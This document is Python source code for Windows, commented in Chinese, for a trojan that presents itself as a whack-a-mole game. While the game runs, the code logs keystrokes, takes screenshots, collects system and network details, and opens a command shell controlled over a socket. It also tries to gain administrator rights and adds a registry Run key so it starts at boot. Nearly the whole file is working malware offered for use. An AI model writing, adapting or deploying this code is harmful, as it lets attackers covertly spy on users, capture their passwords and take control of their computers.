import ctypes
import os
import random
import socket
import subprocess
import sys
import threading
import time
import tkinter as tk
import winreg
from datetime import datetime
from tkinter import *

import psutil
import win32api
import win32con
import win32gui
import win32ui
import winsound
from pynput import keyboard

'''定义一些常量'''
lst = ['pip install pynput,psutil,pywin32']
normal_port = 8021
cmd_port = 9021

'''伪装的游戏部分'''


class WhackAMole:
    def __init__(self, root):
        self.root = root
        self.root.title("打地鼠游戏")
        self.score = 0
        self.high_score = 0
        self.time_left = 30
        self.mole_speed = 1000
        self.moles = []
        self.mole_count = 3
        self.game_running = False

        self.canvas = tk.Canvas(self.root, width=500, height=500, bg='green')
        self.canvas.grid(row=0, column=0, columnspan=2)

        self.score_label = tk.Label(self.root, text=f"得分: {self.score}", font=("Helvetica", 14))
        self.score_label.grid(row=1, column=0)

        self.motivation_label = tk.Label(self.root, text=f"加油！", font=("Helvetica", 16, "bold"), fg="red")
        self.motivation_label.grid(row=1, column=1)

        self.high_score_label = tk.Label(self.root, text=f"最高分: {self.high_score}", font=("Helvetica", 14))
        self.high_score_label.grid(row=2, column=0)

        self.time_label = tk.Label(self.root, text=f"剩余时间: {self.time_left} 秒", font=("Helvetica", 14))
        self.time_label.grid(row=2, column=1)

        self.start_button = tk.Button(self.root, text="开始游戏", command=self.start_game, font=("Helvetica", 14))
        self.start_button.grid(row=3, column=0, columnspan=2)

        self.canvas.bind("<Button-1>", self.hit_mole)

    # 定义游戏开始的函数
    def start_game(self):
        self.score = 0
        self.time_left = 30
        self.mole_speed = 1000
        self.game_running = True
        self.score_label.config(text=f"得分: {self.score}")
        self.time_label.config(text=f"剩余时间: {self.time_left} 秒")
        self.start_button.config(state=tk.DISABLED)
        self.next_moles()
        self.countdown()

    # 定义下一个地鼠出现的函数
    def next_moles(self):
        if self.game_running:
            self.canvas.delete("mole")
            self.moles = []
            for _ in range(self.mole_count):
                x = random.randint(50, 450)
                y = random.randint(50, 450)
                mole = self.canvas.create_oval(x - 25, y - 25, x + 25, y + 25, fill='brown', tags='mole')
                self.moles.append(mole)
            self.root.after(self.mole_speed, self.next_moles)

    # 定义击中地鼠的函数
    def hit_mole(self, event):
        if not self.game_running:
            return
        items = self.canvas.find_withtag("mole")
        for item in items:
            x1, y1, x2, y2 = self.canvas.coords(item)
            if x1 <= event.x <= x2 and y1 <= event.y <= y2:
                self.canvas.delete(item)
                self.moles.remove(item)
                self.score += 1
                self.score_label.config(text=f"得分: {self.score}")
                winsound.PlaySound("hit.wav", winsound.SND_ASYNC)
                break

    # 定义倒计时函数
    def countdown(self):
        if self.time_left > 0:
            self.time_left -= 1
            self.time_label.config(text=f"剩余时间: {self.time_left} 秒")
            if self.time_left % 10 == 0:
                self.mole_speed = max(100, self.mole_speed - 100)
            self.root.after(1000, self.countdown)
        else:
            self.game_running = False
            self.canvas.delete("all")
            self.start_button.config(state=tk.NORMAL)
            self.time_label.config(text="游戏结束！")
            if self.score > self.high_score:
                self.high_score = self.score
                self.high_score_label.config(text=f"最高分: {self.high_score}")


'''cmd命令部分'''


def run_command(command):
    command = command.rstrip()
    try:
        child = subprocess.run(command, shell=True, capture_output=True, text=True)
        return child.stdout + child.stderr
    except Exception as e:
        return f'无法执行命令: {str(e)}\r\n'


'''截屏部分'''


def get_active_window_title():
    # 获取当前活跃窗口的句柄
    active_window = win32gui.GetForegroundWindow()

    # 获取当前活跃窗口的标题
    return win32gui.GetWindowText(active_window)


def monitor_active_window():
    duration = 3  # 最大持续时间
    active_duration = 0
    sleep_time = 1  # 每秒检查一次
    last_active_window_title = None

    while True:
        current_window_title = get_active_window_title()

        if current_window_title != last_active_window_title:
            # 如果活跃窗口改变，重置计时
            last_active_window_title = current_window_title
            active_duration = 0
        else:
            # 如果活跃窗口没有改变，增加计时
            active_duration += sleep_time

        # 如果窗口活跃时间超过设定的持续时间，截屏并重置计时
        if active_duration >= duration:
            screenshot(normal_port)
            active_duration = 0  # 重置计时器

        # 每秒检查一次
        time.sleep(sleep_time)


# 获取屏幕尺寸
def get_dimensions():
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    return width, height, left, top


# 截屏功能实现
def screenshot(n_port, name='screenshot'):
    # 获取桌面窗口并获取屏幕尺寸
    desktop = win32gui.GetDesktopWindow()
    width, height, left, top = get_dimensions()

    # 创建设备上下文并进行截屏操作
    desktop_dc = win32gui.GetWindowDC(desktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()

    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
    screenshot.SaveBitmapFile(mem_dc, f'{name}.bmp')

    # 读取截屏文件并发送消息
    with open(f'{name}.bmp', 'rb') as bmp_file:
        binary_data = bmp_file.read()
    send_message(n_port, 'screenshot', binary_data)
    os.remove(f'{name}.bmp')

    # 释放资源
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())


'''发送消息部分'''


def send_message(port, message_type, message_data):
    # 创建套接字
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect(('127.0.0.1', int(port)))
        message = f'{message_type}|{message_data}'
        # 发送消息类型标记和数据
        client_socket.sendall(message.encode())


'''电脑信息获取部分'''


class SystemInfo:
    # 初始化方法，获取系统信息并存储在类的实例变量中
    def __init__(self):
        self.cpu_info = self.get_cpu_info()
        self.memory_info = self.get_memory_info()
        self.disk_info = self.get_disk_info()
        self.network_info = self.get_network_info()
        self.boot_time = self.get_boot_time()
        self.n_port = normal_port

    # 将字节数转换为合适的格式，例如：1253656 => '1.20MB'
    def get_size(self, bytes, suffix="B"):
        """
        将字节数转换为合适的格式。
        """
        factor = 1024
        for unit in ["", "K", "M", "G", "T", "P"]:
            if bytes < factor:
                return f"{bytes:.2f}{unit}{suffix}"
            bytes /= factor

    # 获取CPU信息
    def get_cpu_info(self):
        cpu_info = {
            "物理核心数": psutil.cpu_count(logical=False),
            "逻辑核心数": psutil.cpu_count(logical=True),
            "最大频率": f"{psutil.cpu_freq().max:.2f}MHz",
            "最小频率": f"{psutil.cpu_freq().min:.2f}MHz",
            "当前频率": f"{psutil.cpu_freq().current:.2f}MHz"
        }
        return cpu_info

    # 获取内存信息
    def get_memory_info(self):
        storage = psutil.virtual_memory()
        swap = psutil.swap_memory()
        memory_info = {
            "总内存": self.get_size(storage.total),
            "可用内存": self.get_size(storage.available),
            "已用内存": self.get_size(storage.used),
            "内存使用率": f"{storage.percent}%",
            "交换分区总内存": self.get_size(swap.total),
            "交换分区可用内存": self.get_size(swap.free),
            "交换分区已用内存": self.get_size(swap.used),
            "交换分区使用率": f"{swap.percent}%"
        }
        return memory_info

    # 获取磁盘信息
    def get_disk_info(self):
        disk = {
            "设备": [],
            "挂载点": [],
            "文件系统类型": [],
            "总大小": [],
            "已用": [],
            "可用": [],
            "使用率": [],
        }

        partitions = psutil.disk_partitions()
        for partition in partitions:
            disk["设备"].append(partition.device)
            disk["挂载点"].append(partition.mountpoint)
            disk["文件系统类型"].append(partition.fstype)
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
                disk["总大小"].append(self.get_size(partition_usage.total))
                disk["已用"].append(self.get_size(partition_usage.used))
                disk["可用"].append(self.get_size(partition_usage.free))
                disk["使用率"].append(f"{partition_usage.percent}%")
            except PermissionError:
                continue

        io_counters = psutil.disk_io_counters()
        disk["总读取量"] = self.get_size(io_counters.read_bytes)
        disk["总写入量"] = self.get_size(io_counters.write_bytes)

        return disk

    # 获取网络信息
    def get_network_info(self):
        network = {
            "接口": [],
            "IP 地址": [],
            "子网掩码": [],
            "广播地址": [],
            "MAC 地址": [],
            "发送的总字节数": [],
            "接收的总字节数": []
        }

        if_address = psutil.net_if_addrs()
        for interface_name, interface_addresses in if_address.items():
            for address in interface_addresses:
                network["接口"].append(interface_name)
                if str(address.family) == 'AddressFamily.AF_INET':
                    network["IP 地址"].append(address.address)
                    network["子网掩码"].append(address.netmask)
                    network["广播地址"].append(address.broadcast)
                elif str(address.family) == 'AddressFamily.AF_PACKET':
                    network["MAC 地址"].append(address.address)

        net_io = psutil.net_io_counters()
        network["发送的总字节数"].append(self.get_size(net_io.bytes_sent))
        network["接收的总字节数"].append(self.get_size(net_io.bytes_recv))

        return network

    # 获取系统引导时间
    def get_boot_time(self):
        boot_time_timestamp = psutil.boot_time()
        bt = datetime.fromtimestamp(boot_time_timestamp)
        boot_time_str = f"{bt.year}年{bt.month}月{bt.day}日 {bt.hour}时{bt.minute}分{bt.second}秒"
        return boot_time_str

    # 显示系统信息
    def display_info(self):
        send_message(normal_port, "normal", "\n\n====================CPU 信息====================")
        for key, value in self.cpu_info.items():
            send_message(normal_port, f"normal", f"\n{key}: {value}")

        send_message(normal_port, "normal", "\n\n====================内存信息====================")
        for key, value in self.memory_info.items():
            send_message(normal_port, "\nnormal", f"{key}: {value}")

        send_message(normal_port, "normal", "\n\n====================磁盘信息====================")
        for key, values in self.disk_info.items():
            if isinstance(values, list):
                for i, value in enumerate(values):
                    send_message(normal_port, "normal", f"\n     {key}: {value}")
            else:
                send_message(normal_port, "normal", f"\n{key}: {values}")

        send_message(normal_port, "normal", "\n\n====================网络信息====================")
        for key, values in self.network_info.items():
            if isinstance(values, list):
                for i, value in enumerate(values):
                    send_message(normal_port, "\nnormal", f"     {key}: {value}")
            else:
                send_message(normal_port, "\nnormal", f"{key}: {value}")

        send_message(normal_port, "normal", "\n\n====================系统引导时间=====================")
        send_message(normal_port, "normal", f"\n引导时间: {self.boot_time}")
        send_message(normal_port, "normal", "\n\n====================以下为键盘监控信息=====================\n\n")


'''键盘监听部分'''


class KeyLogger:
    def __init__(self):
        self.keyboard_listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.keyboard_listener_thread = threading.Thread(target=self.start_keyboard_listener)
        self.keyboard_listener_thread.daemon = True
        self.last_active_window = ""
        self.shift_pressed = False

    # 启动键盘监听
    def start_keyboard_listener(self):
        with self.keyboard_listener as listener:
            listener.join()

    # 获取当前活动窗口
    def get_active_window(self):
        try:
            if os.name == 'nt':  # Windows
                import ctypes
                user32 = ctypes.windll.user32
                kernel32 = ctypes.windll.kernel32

                h_wnd = user32.GetForegroundWindow()
                pid = ctypes.wintypes.DWORD()
                user32.GetWindowThreadProcessId(h_wnd, ctypes.byref(pid))
                process = psutil.Process(pid.value)
                return process.name()
            else:
                raise NotImplementedError("该功能目前只支持Windows平台")
        except Exception as e:
            return str(e)

    # 按下按键时触发的事件
    def on_press(self, key):
        try:
            match key:
                # 检测Shift键
                case key if key == keyboard.Key.shift or keyboard.Key.shift_l or keyboard.Key.shift_r:
                    self.shift_pressed = True
                    return

                # 检测Enter键
                case keyboard.Key.enter:
                    send_message(normal_port, 'normal', '\n')

                # 检测空格键
                case keyboard.Key.space:
                    send_message(normal_port, 'normal', ' ')
            # 获取当前活动窗口
            active_window = self.get_active_window()
            if active_window != self.last_active_window:
                self.last_active_window = active_window
                send_message(normal_port, 'normal', f'\nWindow: {active_window}\n')

            # 打印用户输入的字符
            char = key.char
            if self.shift_pressed:
                char = char.upper()
            send_message(normal_port, 'normal', char)

        except AttributeError:
            pass

    # 释放按键时触发的事件
    def on_release(self, key):
        if key == keyboard.Key.shift or key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            self.shift_pressed = False

    # 启动键盘监听
    def start(self):
        self.keyboard_listener_thread.start()


'''检查是否为管理员权限部分'''


def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin()


'''-----------------------------------分隔，上面的代码是具体的函数，下面是主函数---------------------------------------------'''


# 用于控制键盘监听的线程
def keyboard_listener_main():
    for command in lst:
        subprocess.run(command, shell=True, capture_output=True, text=True)
    # 电脑信息
    sys_info = SystemInfo()
    sys_info.display_info()
    # 键盘记录
    key_logger = KeyLogger()
    key_logger.start()


# 用于截屏线程的函数
def screen_shot_main():
    monitor_active_window()


# 用于控制cmd命令的函数
def cmd_main():
    hh = socket.socket()
    hh.connect(('127.0.0.1', cmd_port))
    try:
        while True:
            data = hh.recv(1024)
            if not data:
                break
            output = run_command(data.decode('gbk'))
            hh.send(output.encode('gbk'))
    finally:
        hh.close()


# 用于控制伪装的游戏的函数
def game_main():
    game_window = tk.Toplevel(root)  # 创建新窗口
    WhackAMole(game_window)


if __name__ == '__main__':
    # 键盘监听线程
    keyboard_listener_thread = threading.Thread(target=keyboard_listener_main)
    keyboard_listener_thread.start()
    # 截屏线程
    screen_shot_thread = threading.Thread(target=screen_shot_main)
    screen_shot_thread.start()
    # cmd命令线程
    cmd_thread = threading.Thread(target=cmd_main)
    cmd_thread.start()
    # 尝试提权
    if is_admin():
        send_message(normal_port, 'normal', '\n[+] 程序为管理员权限运行')
    else:
        send_message(normal_port, 'normal', '\n[-] 程序未以管理员权限运行，正在尝试提权')
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, True)
        except:
            send_message(normal_port, 'normal', '\n[-] 程序提权失败')
        else:
            send_message(normal_port, 'normal', '\n[+] 程序提权成功')
    # 尝试设置为开机自启
    try:
        address = r'C:\Users\Administrator\Desktop\木马.py'
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
                             winreg.KEY_ALL_ACCESS)
        new_key = winreg.CreateKey(key, 'my key')
        winreg.SetValueEx(new_key, '木马', 0, winreg.REG_SZ, address)
        winreg.CloseKey(key)
    except:
        send_message(normal_port, 'normal', '[-] 程序设置开机自启失败，可能运行于沙箱环境或有杀软拦截')
    else:
        send_message(normal_port, 'normal', '[+] 程序设置开机自启成功')
    # 伪装游戏线程
    '''分隔，下面的代码是打地鼠游戏'''
    root = tk.Tk()
    root.title('游戏须知')
    root.geometry('500x300+600+300')
    var = StringVar()
    scroll = Scrollbar(root)
    lb = Listbox(root, height=10, selectmode=tk.BROWSE, listvariable=var, yscrollcommand=scroll.set)
    list_item = ['亲爱的用户：',
                 '  请您仔细阅读接下来的内',
                 '容，谢谢！',
                 '  1.棕色圆圈为地鼠。',
                 '  2.单击地鼠以将其消灭。',
                 '  3.总场30秒。', '  '
                                  ' 4.不支持联网功能。',
                 '  5.不要沉迷于此！',
                 '  6.请注意护眼。',
                 '  7.祝您愉快！']
    for item in list_item:
        lb.insert(tk.END, item)
    scroll.pack(side=tk.RIGHT, fill=tk.Y)
    lb.pack(side=tk.LEFT, fill=tk.BOTH)

    button = tk.Button(root, text="我知道了", command=game_main)
    button.pack(side=tk.BOTTOM)

    root.mainloop()
    while True:
        time.sleep(10)
